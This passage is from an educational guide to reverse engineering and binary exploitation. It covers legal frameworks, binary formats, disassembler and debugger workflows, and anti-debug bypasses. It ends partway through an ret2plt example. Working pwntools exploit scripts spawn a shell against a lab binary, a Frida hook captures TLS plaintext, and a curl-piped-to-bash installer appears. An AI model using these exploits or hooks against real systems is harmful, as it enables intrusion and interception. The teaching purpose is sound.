# Reverse Engineering and Binary Analysis

## From Fundamentals to Advanced Exploitation

---

## Table of Contents

1. [Foundations of Reverse Engineering](#1-foundations-of-reverse-engineering)
2. [Static Analysis](#2-static-analysis)
3. [Dynamic Analysis](#3-dynamic-analysis)
4. [Binary Exploitation Fundamentals](#4-binary-exploitation-fundamentals)
5. [Modern Mitigations and Bypasses](#5-modern-mitigations-and-bypasses)
6. [Malware Analysis](#6-malware-analysis)
7. [Windows Internals for RE](#7-windows-internals-for-re)
8. [Linux Internals for RE](#8-linux-internals-for-re)
9. [Firmware and Embedded Reverse Engineering](#9-firmware-and-embedded-reverse-engineering)
10. [Practical Labs](#10-practical-labs)

---

## 1. Foundations of Reverse Engineering

### 1.1 Legal Framework

Reverse engineering operates within a complex legal landscape that every practitioner must understand before touching a single binary.

#### DMCA (Digital Millennium Copyright Act) — 17 U.S.C. § 1201

The DMCA prohibits circumvention of technological protection measures (TPMs). However, critical exemptions exist for security research:

- **Section 1201(j) — Security Testing**: Permits circumvention conducted solely for the purpose of good-faith testing, investigating, or correcting a security flaw or vulnerability of a computer, computer system, or computer network. The person must obtain authorization from the owner/operator of the system, or must be acting in a manner designed to avoid causing damage.
- **Triennial Rulemaking Exemptions (2021 renewal)**: Exemptions for good-faith security research on computer programs, including firmware on consumer devices, voting machines, medical devices, motorized land vehicles, and networked devices.
- **Interoperability (§1201(f))**: Permits reverse engineering for achieving interoperability of independently created programs, provided the information is not otherwise readily available.

#### CFAA (Computer Fraud and Abuse Act) — 18 U.S.C. § 1030

The CFAA criminalizes unauthorized access to computer systems. Key considerations:

- **Van Buren v. United States (2021)**: SCOTUS narrowed the interpretation — the "exceeds authorized access" clause applies only when one obtains information to which their computer access does not extend, not when someone misuses access they otherwise have.
- **Safe harbor**: Authorized penetration testing under contract, bug bounty programs with explicit scope definitions, and research on systems you own or have written permission to test.
- **DOJ 2022 Policy**: DOJ will no longer charge good-faith security researchers under CFAA provided the research is done to improve cybersecurity, not for financial gain through extortion or data theft.

#### International Considerations

- **EU Directive 2009/24/EC, Art. 6**: Permits decompilation for interoperability.
- **EU Computer Programs Directive**: Allows observation, study, and testing of program functionality without authorization.
- **UK Computer Misuse Act 1990**: No explicit security research exemption — rely on authorization.
- **Japan Unfair Competition Prevention Act**: Permits reverse engineering for studying program ideas and principles.

#### Ethical Framework

Beyond legality, ethical reverse engineering requires:

1. **Scope definition**: Written authorization specifying exactly which binaries, systems, and techniques are in scope.
2. **Proportionality**: Use the minimum invasive technique necessary to achieve the research objective.
3. **Responsible disclosure**: Follow coordinated disclosure timelines (typically 90 days per Google Project Zero standard, 45 days per ZDI).
4. **Evidence preservation**: Maintain chain of custody with cryptographic hashes, timestamps, and unmodified captures.
5. **No collateral damage**: Avoid disrupting systems, exfiltrating user data, or creating persistent backdoors beyond what PoC requires.

### 1.2 CPU Architecture Essentials

#### x86-64 Architecture

##### Registers

The x86-64 architecture extends x86 with 64-bit general-purpose registers:

```
┌─────────────────────────────────────────────────────────────┐
│  64-bit    │  32-bit  │  16-bit  │  8-bit H │  8-bit L     │
├─────────────────────────────────────────────────────────────┤
│  RAX       │  EAX     │  AX      │  AH      │  AL          │
│  RBX       │  EBX     │  BX      │  BH      │  BL          │
│  RCX       │  ECX     │  CX      │  CH      │  CL          │
│  RDX       │  EDX     │  DX      │  DH      │  DL          │
│  RSI       │  ESI     │  SI      │  —       │  SIL         │
│  RDI       │  EDI     │  DI      │  —       │  DIL         │
│  RBP       │  EBP     │  BP      │  —       │  BPL         │
│  RSP       │  ESP     │  SP      │  —       │  SPL         │
│  R8–R15    │  R8D–R15D│  R8W–R15W│  —       │  R8B–R15B    │
├─────────────────────────────────────────────────────────────┤
│  RIP       │  Instruction Pointer                           │
│  RFLAGS    │  Flags Register (CF, ZF, SF, OF, PF, AF)      │
├─────────────────────────────────────────────────────────────┤
│  XMM0–XMM15│  128-bit SSE registers                        │
│  YMM0–YMM15│  256-bit AVX registers                        │
│  ZMM0–ZMM31│  512-bit AVX-512 registers                    │
└─────────────────────────────────────────────────────────────┘
```

##### System V AMD64 ABI Calling Convention (Linux/macOS)

```
Arguments:  RDI, RSI, RDX, RCX, R8, R9 (integer/pointer)
            XMM0–XMM7 (floating point)
Return:     RAX (integer), XMM0 (float)
Callee-saved: RBX, RBP, R12–R15
Caller-saved: RAX, RCX, RDX, RSI, RDI, R8–R11
Stack:      16-byte aligned before CALL instruction
Red zone:   128 bytes below RSP (leaf functions may use without adjusting RSP)
```

##### Microsoft x64 Calling Convention (Windows)

```
Arguments:  RCX, RDX, R8, R9 (first 4 integer/pointer)
            XMM0–XMM3 (floating point)
Shadow space: 32 bytes always allocated by caller
Return:     RAX
Callee-saved: RBX, RBP, RDI, RSI, R12–R15, XMM6–XMM15
Stack:      16-byte aligned before CALL
```

##### Stack Frame Layout

```
High addresses
┌──────────────────────┐
│  Caller's frame      │
├──────────────────────┤
│  Return address      │  ← [RBP + 8]
├──────────────────────┤
│  Saved RBP           │  ← RBP points here
├──────────────────────┤
│  Local variable 1    │  ← [RBP - 8]
│  Local variable 2    │  ← [RBP - 16]
│  ...                 │
├──────────────────────┤
│  Canary (if enabled) │
├──────────────────────┤
│  Spilled registers   │
├──────────────────────┤
│  Red zone (128 bytes)│  ← RSP (leaf functions only)
└──────────────────────┘
Low addresses
```

##### Instruction Encoding

x86-64 uses variable-length encoding (1–15 bytes):

```
[Prefixes] [REX] [Opcode] [ModR/M] [SIB] [Displacement] [Immediate]

REX prefix (0x40–0x4F): Extends registers to R8–R15, enables 64-bit operand size
  0100 WRXB
  W = 64-bit operand size
  R = extends ModR/M reg field
  X = extends SIB index field
  B = extends ModR/M r/m, SIB base, or opcode reg

ModR/M byte: [Mod:2][Reg:3][R/M:3]
  Mod=00: [R/M] indirect
  Mod=01: [R/M + disp8]
  Mod=10: [R/M + disp32]
  Mod=11: register direct
```

#### ARM64 (AArch64) Architecture

ARM64 uses fixed 32-bit instruction encoding with a cleaner register model:

```
┌─────────────────────────────────────────────────────────┐
│  General purpose: X0–X30 (64-bit), W0–W30 (32-bit)     │
│  X0–X7:   Arguments and return values                   │
│  X8:      Indirect result location register             │
│  X9–X15:  Caller-saved temporaries                      │
│  X16–X17: Intra-procedure-call scratch (IP0/IP1)        │
│  X18:     Platform register (reserved)                  │
│  X19–X28: Callee-saved                                  │
│  X29:     Frame pointer (FP)                            │
│  X30:     Link register (LR) — return address           │
│  SP:      Stack pointer (separate from X registers)     │
│  PC:      Program counter (not directly accessible)     │
│  XZR/WZR: Zero register (reads as 0, writes discarded)  │
│  V0–V31:  128-bit SIMD/FP registers                     │
└─────────────────────────────────────────────────────────┘
```

Key ARM64 instruction encoding patterns (all 32 bits):

```
Data Processing (Register):  [sf][opc][S][11010][shift][Rm][imm6][Rn][Rd]
Data Processing (Immediate): [sf][opc][100][shift][imm12][Rn][Rd]
Loads/Stores:                [size][1][1][1][0][opc][imm12][Rn][Rt]
Branches:                    [op][00101][imm26]
Conditional Branch:          [0101010][0][imm19][0][cond]
```

### 1.3 Memory Layout

A typical process memory map (Linux, x86-64):

```
0x0000000000000000 ┌─────────────────────┐
                   │  NULL page (unmapped)│  Catches null-ptr derefs
0x0000000000400000 ├─────────────────────┤
                   │  .text (code)        │  r-x  Executable instructions
                   ├─────────────────────┤
                   │  .rodata             │  r--  Read-only data, string literals
                   ├─────────────────────┤
                   │  .data               │  rw-  Initialized global/static variables
                   ├─────────────────────┤
                   │  .bss                │  rw-  Uninitialized globals (zero-filled)
                   ├─────────────────────┤
                   │         ↓            │
                   │  Heap (brk/mmap)     │  rw-  Dynamic allocation, grows upward
                   │                      │
                   │      [gap — mmap]    │       Shared libraries, large allocations
                   │                      │
                   │         ↑            │
                   │  Stack              │  rw-  Function frames, grows downward
0x00007FFFFFFFFFFF ├─────────────────────┤
                   │  Kernel space        │  Not accessible from userland
0xFFFFFFFFFFFFFFFF └─────────────────────┘
```

**Segment details**:

- **.text**: Machine code. Mapped `PROT_READ|PROT_EXEC`. Self-modifying code requires `mprotect()`.
- **.rodata**: String literals, jump tables, vtables. Attempts to write trigger SIGSEGV.
- **.data**: Initialized globals (`int x = 42;`). Writable. Persists across function calls.
- **.bss**: Uninitialized or zero-initialized globals. Kernel zero-fills pages on demand (lazy allocation).
- **Heap**: Managed by allocator (ptmalloc2/jemalloc/tcmalloc). `brk()` extends for small allocations; `mmap()` for large.
- **Stack**: Thread-local. Default 8MB on Linux (`ulimit -s`). Guard page below prevents silent overflow into other mappings.

### 1.4 ELF Format Deep Dive

The Executable and Linkable Format is the standard binary format for Linux, BSD, and most Unix-like systems.

```
┌────────────────────────────────────┐
│  ELF Header (64 bytes)             │
├────────────────────────────────────┤
│  Program Header Table              │  ← Execution view (segments)
├────────────────────────────────────┤
│  .interp                           │  Path to dynamic linker
│  .note.gnu.build-id               │  Build identification
│  .gnu.hash                         │  GNU hash table for symbol lookup
│  .dynsym                           │  Dynamic symbol table
│  .dynstr                           │  Dynamic string table
│  .gnu.version                      │  Symbol versioning
│  .gnu.version_r                    │  Version requirements
│  .rela.dyn                         │  Dynamic relocations
│  .rela.plt                         │  PLT relocations
│  .init                             │  Initialization code
│  .plt                              │  Procedure Linkage Table
│  .plt.got                          │  PLT (GOT variant)
│  .text                             │  Executable code
│  .fini                             │  Finalization code
│  .rodata                           │  Read-only data
│  .eh_frame_hdr                     │  Exception handling frame header
│  .eh_frame                         │  Exception handling frames
│  .init_array                       │  Constructors
│  .fini_array                       │  Destructors
│  .dynamic                          │  Dynamic linking information
│  .got                              │  Global Offset Table
│  .got.plt                          │  GOT entries for PLT
│  .data                             │  Initialized data
│  .bss                              │  Uninitialized data
├────────────────────────────────────┤
│  Section Header Table              │  ← Linking view (sections)
└────────────────────────────────────┘
```

**ELF Header structure** (key fields):

```c
typedef struct {
    unsigned char e_ident[16];  // Magic: 7f 45 4c 46, class, endianness, version, OS/ABI
    Elf64_Half    e_type;       // ET_EXEC(2), ET_DYN(3-PIE/shared), ET_REL(1-relocatable)
    Elf64_Half    e_machine;    // EM_X86_64(62), EM_AARCH64(183), EM_ARM(40)
    Elf64_Word    e_version;
    Elf64_Addr    e_entry;      // Entry point virtual address
    Elf64_Off     e_phoff;      // Program header table offset
    Elf64_Off     e_shoff;      // Section header table offset
    Elf64_Word    e_flags;
    Elf64_Half    e_ehsize;     // ELF header size (64 bytes for 64-bit)
    Elf64_Half    e_phentsize;  // Program header entry size (56 bytes)
    Elf64_Half    e_phnum;      // Number of program headers
    Elf64_Half    e_shentsize;  // Section header entry size (64 bytes)
    Elf64_Half    e_shnum;      // Number of section headers
    Elf64_Half    e_shstrndx;   // Section name string table index
} Elf64_Ehdr;
```

**Program Headers (PT_LOAD segments)** define what the kernel maps into memory:

```
LOAD  offset=0x0000  vaddr=0x400000  filesz=0x1000  memsz=0x1000  flags=R
LOAD  offset=0x1000  vaddr=0x401000  filesz=0x2000  memsz=0x2000  flags=R E
LOAD  offset=0x3000  vaddr=0x403000  filesz=0x500   memsz=0x500   flags=R
LOAD  offset=0x3500  vaddr=0x404500  filesz=0x200   memsz=0x400   flags=RW
```

### 1.5 PE Format Deep Dive

The Portable Executable format is used by Windows for executables, DLLs, drivers, and firmware:

```
┌────────────────────────────────────┐
│  DOS Header (MZ)                   │  64 bytes, e_lfanew → PE signature
├────────────────────────────────────┤
│  DOS Stub                          │  "This program cannot be run in DOS mode"
├────────────────────────────────────┤
│  PE Signature ("PE\0\0")           │  4 bytes
├────────────────────────────────────┤
│  COFF File Header                  │  20 bytes
├────────────────────────────────────┤
│  Optional Header                   │  PE32+ = 240 bytes
│    ├─ Standard Fields              │  Magic(0x20B for PE32+), entry, base of code
│    ├─ Windows-Specific Fields      │  ImageBase, SectionAlignment, subsystem
│    └─ Data Directories (16)        │  Export, Import, Resource, Exception,
│                                    │  Security, Relocation, Debug, TLS,
│                                    │  Load Config, Bound Import, IAT,
│                                    │  Delay Import, CLR Header, Reserved
├────────────────────────────────────┤
│  Section Headers                   │
│    .text   (code)                  │  IMAGE_SCN_MEM_EXECUTE | READ
│    .rdata  (read-only data)        │  IMAGE_SCN_MEM_READ
│    .data   (initialized data)      │  IMAGE_SCN_MEM_READ | WRITE
│    .rsrc   (resources)             │  IMAGE_SCN_MEM_READ
│    .reloc  (relocations)           │  IMAGE_SCN_MEM_DISCARDABLE | READ
├────────────────────────────────────┤
│  Section Bodies                    │
│  ...                               │
└────────────────────────────────────┘
```

**Import Address Table (IAT)** resolution:

```
Import Directory Table → DLL name + Import Lookup Table (ILT)
ILT entries → Hint/Name Table entries (ordinal or name)
At load time: loader resolves → writes addresses into IAT
Runtime: CALL [IAT_entry] dereferences pointer to actual function
```

### 1.6 Mach-O Format

Used by macOS, iOS, and all Apple platforms:

```
┌────────────────────────────────────┐
│  Mach-O Header                     │  Magic (0xFEEDFACF for 64-bit), cputype
├────────────────────────────────────┤
│  Load Commands                     │
│    LC_SEGMENT_64 (__TEXT)           │  Code, string literals
│    LC_SEGMENT_64 (__DATA)          │  Writable globals, GOT
│    LC_SEGMENT_64 (__DATA_CONST)    │  Const after fixups
│    LC_SEGMENT_64 (__LINKEDIT)      │  Symbol tables, signatures
│    LC_DYLD_INFO_ONLY               │  Rebase/bind/export info
│    LC_SYMTAB                       │  Symbol table
│    LC_DYSYMTAB                     │  Dynamic symbol table
│    LC_LOAD_DYLINKER               │  /usr/lib/dyld
│    LC_LOAD_DYLIB                   │  Dependent shared libraries
│    LC_CODE_SIGNATURE               │  Code signature
│    LC_MAIN                         │  Entry point (offset)
├────────────────────────────────────┤
│  Segment Data                      │
│    __TEXT,__text                    │  Machine code
│    __TEXT,__stubs                   │  PLT equivalent
│    __TEXT,__stub_helper             │  Lazy binding helper
│    __DATA,__la_symbol_ptr          │  Lazy symbol pointers
│    __DATA,__got                    │  Non-lazy GOT
│    __DATA,__objc_classlist         │  ObjC class metadata
└────────────────────────────────────┘
```

Universal (Fat) binaries contain multiple Mach-O slices for different architectures — use `lipo -info` to inspect or `lipo -thin arm64` to extract.

---

## 2. Static Analysis

### 2.1 Disassembly Theory

#### Linear Sweep

Linear sweep disassembly starts at the beginning of the code section and decodes instructions sequentially:

```
Advantages:
- Simple implementation
- Covers every byte in the code section
- Cannot miss code in the section

Disadvantages:
- Fooled by data embedded in code sections (jump tables, constants)
- Cannot handle variable-length instruction sets well when data intervenes
- Produces garbage disassembly for data-as-code regions
```

Used by: `objdump`, simple disassemblers.

#### Recursive Descent

Recursive descent follows control flow, disassembling only reachable code:

```
Algorithm:
1. Start at entry point, add to work queue
2. Disassemble sequentially until a control flow instruction
3. For branches: add both targets (taken/not-taken) to queue
4. For calls: add call target, continue after call
5. For indirect jumps: attempt to resolve targets (value analysis)
6. Mark unreachable bytes as data

Advantages:
- Correctly handles data in code sections
- Respects control flow semantics
- Better accuracy for obfuscated binaries

Disadvantages:
- May miss code reachable only through indirect jumps
- Requires call convention knowledge for proper analysis
- Complex implementation with heuristics needed for edge cases
```

Used by: IDA Pro, Ghidra, Binary Ninja, angr.

### 2.2 IDA Pro Workflow

IDA Pro remains the industry standard for static binary analysis.

#### Navigation Essentials

```
G          - Go to address/name
X          - Cross-references to current item
Ctrl+X     - Cross-references from current item
Space      - Toggle graph/linear view
Tab        - Toggle assembly/pseudocode
N          - Rename symbol
Y          - Change type of function/variable
H          - Toggle hex/decimal
;          - Add comment
Shift+F12  - Open Strings window
Ctrl+F12   - Open Segments window
Alt+T      - Text search in disassembly
```

#### Cross-References (Xrefs)

```
Types:
  Code xrefs:
    Call   (type 'p') - function call to target
    Jump   (type 'j') - branch to target
    
  Data xrefs:
    Read   (type 'r') - data read access
    Write  (type 'w') - data write access
    Offset (type 'o') - address referenced as data

IDA Python xref enumeration:
  import idautils
  for xref in idautils.XrefsTo(ea):
      print(f"  {hex(xref.frm)} -> {hex(xref.to)} type={xref.type}")
```

#### Structure Definition

```c
// Creating structures in IDA for proper type propagation
// Structures window (Shift+F9), then Insert

struct connection_t {
    int socket_fd;              // offset 0x00
    uint32_t state;             // offset 0x04
    char *recv_buffer;          // offset 0x08
    size_t recv_len;            // offset 0x10
    char *send_buffer;          // offset 0x18
    size_t send_len;            // offset 0x20
    struct sockaddr_in peer;    // offset 0x28
    void (*handler)(struct connection_t *);  // offset 0x38
};
```

#### FLIRT Signatures

Fast Library Identification and Recognition Technology identifies library functions:

```bash
# Generate FLIRT signature from a static library
pelf libcrypto.a libcrypto.pat       # create pattern file
sigmake libcrypto.pat libcrypto.sig   # compile to signature

# Place .sig files in: IDA/sig/<platform>/
# IDA applies them automatically or via File → Load File → FLIRT Signature
```

#### IDA Python Scripting

```python
# Enumerate all functions and their sizes
import idautils
import idc

for func_ea in idautils.Functions():
    func_name = idc.get_func_name(func_ea)
    func_end = idc.find_func_end(func_ea)
    size = func_end - func_ea
    print(f"{func_name} @ {hex(func_ea)} size={size}")

# Find all calls to a specific function
target = idc.get_name_ea_simple("memcpy")
if target != idc.BADADDR:
    for xref in idautils.XrefsTo(target):
        caller = idc.get_func_name(xref.frm)
        print(f"  Called from {caller} @ {hex(xref.frm)}")

# Patch bytes in IDA
idc.patch_byte(0x401234, 0x90)  # NOP out a byte
idc.patch_word(0x401234, 0x9090)  # NOP out 2 bytes
```

### 2.3 Ghidra

NSA's open-source reverse engineering framework (Java-based, free).

#### Project Setup

```
File → New Project → Non-Shared Project
Import: File → Import File → select binary
Auto-analysis: Yes (typically all defaults)
    - Decompiler Parameter ID
    - Aggressive Instruction Finder
    - Create Address Tables
    - Embedded Media
    - Non-Returning Functions
```

#### Decompiler Usage

Ghidra's decompiler produces C-like pseudocode. Key operations:

```
Retype variable:     Right-click → Retype Variable (or Ctrl+L)
Rename variable:     Right-click → Rename Variable (or L)
Set function sig:    Right-click function → Edit Function Signature
Equate:             Right-click constant → Set Equate (map to enum)
Override call:       Right-click call → Override Signature
```

#### Ghidra Scripts (Java/Python)

```python
# Ghidra Python script: Find all XOR operations (potential crypto/encoding)
# @category Analysis

from ghidra.program.model.listing import CodeUnit
from ghidra.app.decompiler import DecompInterface

listing = currentProgram.getListing()
memory = currentProgram.getMemory()
addr_set = currentProgram.getMemory()

instructions = listing.getInstructions(addr_set, True)
xor_locations = []

for instr in instructions:
    mnemonic = instr.getMnemonicString()
    if "XOR" in mnemonic.upper():
        # Filter out XOR reg, reg (zeroing idiom)
        ops = instr.getDefaultOperandRepresentationList(0)
        op1 = instr.getDefaultOperandRepresentation(0)
        op2 = instr.getDefaultOperandRepresentation(1)
        if op1 != op2:
            xor_locations.append(instr.getAddress())
            print(f"XOR @ {instr.getAddress()}: {instr}")

print(f"\nFound {len(xor_locations)} non-trivial XOR instructions")
```

#### Collaboration (Ghidra Server)

```bash
# Server setup
ghidraSvr start
ghidraSvr add <username>

# Client connects via File → New Project → Shared Project
# Provides: concurrent analysis, annotation sharing, version control
# Lock mechanism prevents conflicting edits
```

### 2.4 Binary Ninja

Commercial framework with best-in-class intermediate languages.

#### Multi-Level IL

```
Disassembly    →  Lifted IL      →  Low Level IL (LLIL)
               →  Medium Level IL (MLIL)
               →  High Level IL (HLIL)

Each level increases abstraction:
- LLIL: Architecture-independent but retains all side effects
- MLIL: SSA form, dead code eliminated, calls resolved
- HLIL: C-like output, structured control flow recovered
```

#### MLIL Example

```python
# Binary Ninja Python API: Find potential buffer overflows
from binaryninja import *

bv = BinaryViewType.get_view_of_file("/path/to/binary")
dangerous_funcs = ["strcpy", "strcat", "gets", "sprintf", "scanf"]

for func in bv.functions:
    for block in func.medium_level_il:
        for instr in block:
            if instr.operation == MediumLevelILOperation.MLIL_CALL:
                target = instr.dest
                if hasattr(target, 'constant') and target.constant in bv.symbols:
                    name = bv.get_symbol_at(target.constant).name
                    if name in dangerous_funcs:
                        print(f"[!] {name} called in {func.name} @ {hex(instr.address)}")
```

### 2.5 Radare2 / Rizin

Open-source, command-line-first reverse engineering framework.

```bash
# Basic analysis session
r2 -A ./target_binary          # Open with auto-analysis
> afl                          # List all functions
> pdf @ main                   # Print disassembly of main
> axt @ sym.imp.system         # Cross-references to system()
> iz                           # List strings in data sections
> izz                          # List all strings in binary
> iE                           # List exports
> ii                           # List imports
> iS                           # List sections
> afl~crypto                   # Filter functions containing "crypto"

# Visual mode
> V                            # Enter visual mode
> VV                           # Enter graph mode
> p/P                          # Cycle through view modes

# Seeking and navigation
> s main                       # Seek to main
> sf sym.foo                   # Seek to function foo

# Writing and patching
> wa nop @ 0x401234            # Write NOP assembly
> wao nop @ 0x401234           # Write NOP opcode (single instruction)

# Debugging
> r2 -d ./target               # Open in debug mode
> db 0x401234                  # Set breakpoint
> dc                           # Continue execution
> dr                           # Print registers
> px 64 @ rsp                  # Print 64 hex bytes at RSP
```

### 2.6 Cutter (Rizin GUI)

Cutter provides a Qt-based GUI for Rizin with integrated decompiler (Ghidra's via r2ghidra plugin). Key workflow advantages: graph view, hex editor, integrated terminal for r2 commands, and type editor pane. Suited for analysts transitioning from commercial tools without budget.

---

## 3. Dynamic Analysis

### 3.1 GDB with Extensions

#### GDB + GEF (GDB Enhanced Features)

```bash
# Installation
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
# Or manually: pip3 install gef && gef install

# Session workflow
gdb ./vulnerable_binary
gef➤  info functions                  # List all functions
gef➤  disassemble main                # Disassemble main
gef➤  break *main+42                  # Break at offset
gef➤  break *0x401234                 # Break at address
gef➤  run $(python3 -c 'print("A"*100)')  # Run with input
gef➤  info registers                  # View all registers
gef➤  x/20gx $rsp                     # Examine 20 quad-words at RSP
gef➤  x/s 0x402000                    # Examine as string
gef➤  vmmap                           # Show memory mappings
gef➤  heap chunks                     # Show heap state
gef➤  got                             # Show GOT entries
gef➤  checksec                        # Check binary protections
gef➤  pattern create 200              # Create De Bruijn pattern
gef➤  pattern search $rsp             # Find offset in pattern
gef➤  telescope $rsp 20              # Smart stack display
```

#### GDB + pwndbg

```bash
# pwndbg provides similar features with different UX
gdb ./binary
pwndbg> context                       # Full context display
pwndbg> nextcall                      # Step until next call
pwndbg> rop -- --grep "pop rdi"       # Find ROP gadgets
pwndbg> search -s "/bin/sh"          # Search memory for string
pwndbg> canary                        # Show stack canary value
pwndbg> got                           # Display GOT table
pwndbg> plt                           # Display PLT entries
pwndbg> retaddr                       # Show return addresses on stack
```

#### GDB Session Transcript — Stack Overflow Analysis

```
$ gdb ./vuln_server
gef➤  checksec
[+] checksec for '/home/user/vuln_server'
Canary                        : ✗
NX                            : ✓
PIE                           : ✗
Fortify                       : ✗
RelRO                         : Partial

gef➤  disassemble handle_request
Dump of assembler code for function handle_request:
   0x0000000000401196 <+0>:     push   rbp
   0x0000000000401197 <+1>:     mov    rbp,rsp
   0x000000000040119a <+4>:     sub    rsp,0x80
   0x00000000004011a1 <+11>:    mov    DWORD PTR [rbp-0x74],edi
   0x00000000004011a4 <+14>:    lea    rax,[rbp-0x70]
   0x00000000004011a8 <+18>:    mov    edx,0x200          ; size = 512 (buf is 0x70=112)
   0x00000000004011ad <+23>:    mov    rsi,rax
   0x00000000004011b0 <+26>:    mov    edi,DWORD PTR [rbp-0x74]
   0x00000000004011b3 <+29>:    call   0x401050 <read@plt>
   0x00000000004011b8 <+34>:    leave
   0x00000000004011b9 <+35>:    ret

gef➤  break *0x4011b8
gef➤  run
[... send 200 bytes ...]
gef➤  x/4gx $rbp
0x7fffffffdea0: 0x4141414141414141  0x4141414141414141
                ^^^^^^^^^^^^^^^^^^
                Saved RBP overwritten

gef➤  info frame
Stack level 0, frame at 0x7fffffffdeb0:
 rip = 0x4011b8; saved rip = 0x4141414141414141
 ← Return address controlled
```

### 3.2 WinDbg

```
# Key commands
!analyze -v          # Automatic crash analysis
lm                   # List loaded modules
bp kernel32!CreateFileW  # Set breakpoint
bl                   # List breakpoints
g                    # Go (continue)
p                    # Step over
t                    # Step into
k                    # Stack backtrace
!peb                 # Display Process Environment Block
!teb                 # Display Thread Environment Block
dt ntdll!_PEB @$peb  # Dump PEB structure
!heap -stat          # Heap statistics
!address             # Memory region info
.writemem C:\dump.bin addr L size  # Dump memory to file
```

### 3.3 Breakpoint Types

```
Software Breakpoints:
  - Replaces instruction byte with INT3 (0xCC)
  - Unlimited number
  - Modifies code → detectable by integrity checks
  - Restored transparently by debugger on hit

Hardware Breakpoints (DR0–DR3):
  - Uses CPU debug registers (x86: DR0–DR3 address, DR7 control)
  - Maximum 4 simultaneously
  - Can trigger on: execution, write, read/write, I/O
  - Configurable size: 1, 2, 4, or 8 bytes
  - Invisible to code integrity checks
  - Detectable via GetThreadContext() or RDMSR

Conditional Breakpoints:
  GDB:    break *0x401234 if $rax == 0x41414141
  WinDbg: bp 0x401234 ".if(@rax==0x41414141){}.else{gc}"
  
Memory Breakpoints (watchpoints):
  GDB:    watch *0x7fffffffdea8     # Break on write
          rwatch *0x7fffffffdea8    # Break on read
          awatch *0x7fffffffdea8    # Break on access
```

### 3.4 Tracing

```bash
# strace — system call tracing (Linux)
strace -f -e trace=network ./server    # Trace network syscalls, follow forks
strace -e trace=file -o trace.log ./app  # File operations to log
strace -c ./binary                      # Syscall statistics

# ltrace — library call tracing
ltrace -e strcmp+strcpy+malloc ./binary  # Trace specific functions
ltrace -C ./binary                      # Demangle C++ names

# DTrace (macOS/Solaris/FreeBSD)
dtrace -n 'syscall::open*:entry { printf("%s %s", execname, copyinstr(arg0)); }'

# frida-trace — dynamic instrumentation
frida-trace -i "recv*" -i "send*" ./network_app
frida-trace -U -i "CCCrypt*" com.target.app  # iOS crypto tracing
```

### 3.5 Instrumentation Frameworks

#### Frida

```javascript
// Frida script: Hook SSL_write/SSL_read for TLS traffic interception
Interceptor.attach(Module.findExportByName("libssl.so", "SSL_write"), {
    onEnter: function(args) {
        this.buf = args[1];
        this.len = args[2].toInt32();
    },
    onLeave: function(retval) {
        if (retval.toInt32() > 0) {
            console.log("[SSL_write] " + hexdump(this.buf, {length: this.len}));
        }
    }
});

// Hook anti-debug check
Interceptor.replace(Module.findExportByName(null, "ptrace"), new NativeCallback(
    function(request, pid, addr, data) {
        console.log("[!] ptrace() called with request=" + request + " → returning 0");
        return 0;
    }, 'long', ['int', 'int', 'pointer', 'pointer']
));
```

#### DynamoRIO

```c
// DynamoRIO client: Instruction counting
#include "dr_api.h"

static int global_count = 0;

static dr_emit_flags_t event_basic_block(void *drcontext, void *tag,
    instrlist_t *bb, bool for_trace, bool translating) {
    
    for (instr_t *instr = instrlist_first(bb); instr != NULL;
         instr = instr_get_next(instr)) {
        global_count++;
    }
    return DR_EMIT_DEFAULT;
}

DR_EXPORT void dr_client_main(client_id_t id, int argc, const char *argv[]) {
    dr_register_bb_event(event_basic_block);
}
```

### 3.6 Anti-Debug Detection and Bypass

Common anti-debug techniques and their bypasses:

```c
// Detection: ptrace self-attach (Linux)
if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
    exit(1);  // Already being debugged
}
// Bypass: LD_PRELOAD hook, Frida hook, or patch conditional jump

// Detection: IsDebuggerPresent (Windows)
if (IsDebuggerPresent()) { ... }
// Location: PEB->BeingDebugged (offset 0x2 in PEB)
// Bypass: Set PEB.BeingDebugged = 0
//   WinDbg: eb @$peb+2 0
//   x64dbg: Plugins → ScyllaHide

// Detection: Timing checks
LARGE_INTEGER start, end;
QueryPerformanceCounter(&start);
// ... code ...
QueryPerformanceCounter(&end);
if ((end.QuadPart - start.QuadPart) > threshold) { exit(1); }
// Bypass: Hook QueryPerformanceCounter, or NOP the comparison

// Detection: Hardware breakpoint check
CONTEXT ctx = {0};
ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
GetThreadContext(GetCurrentThread(), &ctx);
if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) { exit(1); }
// Bypass: Hook GetThreadContext to zero DR registers

// Detection: INT 2D (Windows kernel debugger check)
__try {
    __asm { int 0x2d }
    // If debugger present, exception is swallowed
} __except(EXCEPTION_EXECUTE_HANDLER) {
    // No debugger
}

// Detection: /proc/self/status TracerPid (Linux)
FILE *f = fopen("/proc/self/status", "r");
// Check if TracerPid != 0
// Bypass: Mount overlay, or hook fopen/read
```

---

## 4. Binary Exploitation Fundamentals

### 4.1 Stack Buffer Overflows

#### Classic ret2libc

When NX is enabled (stack non-executable), redirect execution to libc functions:

```python
#!/usr/bin/env python3
# ret2libc exploit using pwntools
from pwn import *

# Binary configuration
binary = ELF('./vulnerable')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Find offsets
offset_to_rip = 120  # Determined via pattern/cyclic

# Gadgets (no PIE, no ASLR for simplicity)
pop_rdi_ret = 0x401233  # pop rdi; ret
ret_gadget = 0x40101a   # ret (for stack alignment)

# Libc addresses (known base for demo)
libc_base = 0x7ffff7c00000
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

payload = flat(
    b'A' * offset_to_rip,
    ret_gadget,        # Stack alignment (16-byte for system())
    pop_rdi_ret,       # pop rdi; ret
    bin_sh_addr,       # "/bin/sh" → RDI
    system_addr        # system("/bin/sh")
)

p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```

#### ret2plt

When ASLR is enabled but binary is not PIE, PLT entries are at known addresses:

```python
# Leak libc address via puts@plt, then ret2libc
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# Stage 1: Leak GOT entry
rop.puts(elf.got['puts'])       # puts(GOT[puts]) → leaks runtime address
rop.call(elf.symbols['main'])   # Return to main for stage 2

payload1 = b'A' * offset + rop.chain()

p = process('./vuln')
p.sendline(payload1)
p.recvuntil(b'\n')

# Parse leaked address
leaked_puts = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"Leaked puts: {hex(leaked_puts)}")

